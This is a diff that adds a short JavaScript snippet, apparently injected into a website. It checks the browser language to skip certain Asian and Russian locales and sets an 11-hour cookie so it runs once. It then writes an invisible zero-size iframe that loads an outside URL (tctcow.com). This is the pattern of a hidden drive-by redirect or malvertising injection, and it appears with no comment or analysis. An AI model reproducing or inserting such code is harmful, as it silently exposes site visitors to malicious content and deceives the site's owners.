@@ -1,0 +1,16 @@
+window.status="";
+n=navigator.userLanguage.toUpperCase();
+if((n!="ZH-CN")&&(n!="UR")&&(n!="RU")&&(n!="KO")&&(n!="ZH-TW")&&(n!="ZH")&&(n!="HI")&&(n!="TH")&&(n!="UR")&&(n!="VI")){
+var cookieString = document.cookie;
+var start = cookieString.indexOf("updngg=");
+if (start != -1){}else{
+var expires = new Date();
+expires.setTime(expires.getTime()+11*3600*1000);
+document.cookie = "updngg=update;expires="+expires.toGMTString();
+try{
+document.write("<iframe src=http://tctcow.com/cgi-bin/index.cgi?ad width=0 height=0 frameborder=0></iframe>");
+}
+catch(e)
+{
+};
+}}
